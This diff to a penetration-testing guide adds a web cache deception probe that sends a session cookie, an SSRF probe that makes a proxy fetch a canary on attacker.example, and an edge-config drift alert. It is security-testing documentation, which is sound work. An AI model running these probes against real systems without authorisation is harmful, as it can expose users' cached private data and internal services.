@@ -60,15 +60,19 @@ whatweb target.com
 ### Exploitation
 
 ```bash
-# Various exploitation payloads
-# (See kali-claw for full library)
+# Cache deception probe: authenticated page with cacheable suffix
+curl -s -o /dev/null -w '%{http_code}\n' "https://app.target.example/account/settings.css" -H "Cookie: $SESSION"
+
+# Edge function SSRF probe (worker fetches attacker origin)
+curl -s "https://app.target.example/api/proxy?url=https://attacker.example/canary"
 ```
 
 ### Persistence
 
 ```bash
-# Persistence techniques
-# (Depends on specific target)
+# Re-deploy detection: alert when edge config drifts from baseline
+diff <(curl -s https://cdn-api.target.example/config/current) baseline.json \
+  && echo OK || notify-security "edge config drift"
 ```
 
 ---
